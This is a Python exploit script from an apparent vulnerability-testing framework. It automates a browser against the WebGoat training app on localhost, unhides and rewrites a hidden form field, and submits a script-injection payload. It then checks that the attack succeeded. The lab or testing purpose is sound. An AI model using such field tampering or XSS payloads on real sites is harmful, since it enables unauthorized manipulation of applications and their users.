from data.exploits.base.BasicExploit import BasicExploit
from settings import mapped_port_host

class Exploit(BasicExploit):

	attributes = {
	  'Name' :		  'WebGoat_ParameterTampering_HiddenFields_2',
	  'Description' : "'Hidden fields manipulation' example from WebGoat",
	  'References' :  [["EMPTY"]],
	  'Target' :	  "webgoat",
	  'Container': 'ubuntu',
	  'TargetLicense' : '',
	  'Plugin' : '',
	  'VulWikiPage' : "None",
	  'Type' : 'Hidden Fields'
	}


	def runExploit(self):
		goat = self.wrapper
		goat.navigate("http://guest:guest@localhost:%s/WebGoat/attack" % mapped_port_host)
		goat.find_name("start").click()
		goat.implicit_wait(5)

		goat.navigate("http://localhost:%s/WebGoat/attack?Screen=5&menu=1600" % mapped_port_host)
		script = "document.getElementsByName('to')[0].type = ''"
		goat.execute_js(script)

		hidden = goat.find_xpath("//input[@name='to']")
		hidden.clear()
		hidden.keys("batman@gotham4ever.com")

		goat.find_xpath("//textarea[@name='msg']").keys("<script>alert('XSS')</script>")
		goat.find_xpath("//input[@value='Send!']").click()

		alert_text = goat.handle_alert()
		self.assertIn("XSS", alert_text, "XSS didn't work!")
		self.assertIn("Congratulations", goat.find("message").raw.text, "Exploit didn't work")
